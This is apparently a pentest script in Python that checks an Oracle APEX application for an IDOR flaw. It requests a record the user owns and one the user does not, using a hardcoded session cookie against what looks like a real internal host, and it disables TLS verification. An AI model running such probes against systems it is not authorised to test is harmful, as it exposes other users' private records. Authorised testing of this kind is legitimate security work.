import requests

# Replace these variables with actual values
base_url = "https://apex-absp.oci.int.juva.nl/ords/"  # Base URL of the APEX application
resource_path = "/f?p=103:85::APPLICATION_PROCESS=GET_RECORD:::P20_ID="  # Resource path of APEX page
cookie_value = "ORA_WWV-6rwz2obkyAdpItcVF0cYVO6m"  # Replace with actual authentication cookie
valid_record_id = "85"  # A valid record ID that belongs to the authenticated user
test_record_id = "200"  # A record ID to test for IDOR (not owned by the authenticated user)

# Headers with authentication cookie
headers = {
    'ORA_WWV_APP_103': f'={cookie_value}'
}

def check_idor(record_id):
    """Check if we can access a resource with a given ID."""
    url = f"{base_url}{resource_path}{record_id}"
    response = requests.get(url, headers=headers, verify=False)

    if response.status_code == 200:
        print(f"Record {record_id} is accessible. Possible IDOR vulnerability!")
        print(f"Response: {response.text[:500]}")  # Print part of the response (first 100 chars)
    else:
        print(f"Record {record_id} is not accessible. No IDOR detected.")

def test_idor():
    """Test with valid and test records."""
    print(f"Testing with valid record ID: {valid_record_id}")
    check_idor(valid_record_id)

    print(f"\nTesting with test record ID: {test_record_id}")
    check_idor(test_record_id)

if __name__ == "__main__":
    test_idor()